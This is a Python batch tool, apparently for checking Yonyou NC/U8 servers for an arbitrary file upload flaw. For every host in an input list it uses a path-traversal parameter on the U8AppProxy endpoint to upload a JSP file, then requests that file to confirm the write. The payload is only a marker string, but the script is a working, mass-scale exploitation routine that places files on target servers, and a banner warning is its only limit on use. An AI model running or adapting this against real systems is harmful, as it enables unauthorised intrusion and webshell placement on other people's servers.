import argparse
from urllib.parse import urljoin

import requests
import sys

from londly import main


def banner():
    print(
        '''
            ***************************************************************
            用友NC 任意文件上传RCE批量漏洞检测工具
            Author: londly
            Last  Date: 2023/03/18
            ***************************************************************
    
            *************************警 告*********************************
            本工具旨在帮助企业快速定位漏洞、修复漏洞，仅限授权安全测试使用！
            请严格遵守《中华人民共和国网络安全法》，禁止未授权非法攻击站点！
            ***************************************************************
        '''
        );
def usage():
    parser=argparse.ArgumentParser(description="漏洞检测");
    parser.add_argument("-f","--file",help="包含ip地址的文件，每行一个", required=True);
    args=parser.parse_args();
    ip_file=args.file;
    return ip_file;

def nc_Check(target_url, Flase=None):
    print("[-] 正在检测目标："+ target_url);
    target = urljoin(target_url,"/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../hello_U8")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate"
    }
    shell_content = 'cs123'
    files = [('file', ('hello_U8.jsp', shell_content, 'application/octet-stream'))]
    response = requests.post(target, files=files, headers=headers, timeout=30, verify=False)
    webshell = urljoin(target_url, "hello_U8.jsp")
    try:
        response = requests.get(webshell, headers=headers, timeout=5, verify=False)
        if response.status_code == 200 and "cs123" in response.text:
            print("[+] 目标可能存在NC_U8AppProxy任意文件上传漏洞")
            return target;
        else:
            print("[-]目标可能不存在漏洞\n");
            return False;
    except requests.exceptions.ConnectTimeout as e1:
        print("[-]访问目标：" + target + "超时，服务端未响应\n");
        return False;
    except requests.exceptions.ConnectionError as e2:
        print("[-]访问目标：" + target + "拒绝或重置，可能存在WAF\n")
        return False;


    
    
    
    
def main():
    banner();
    ip_file=usage();

    vuln_url=[];

    with open(ip_file,"r") as f_r:
        lines=f_r.readlines();
        for line in lines:
            target_url = line.strip("\n");
            target = nc_Check(target_url);
            if target == False:
                continue;
            else:
                vuln_url.append(target);

main();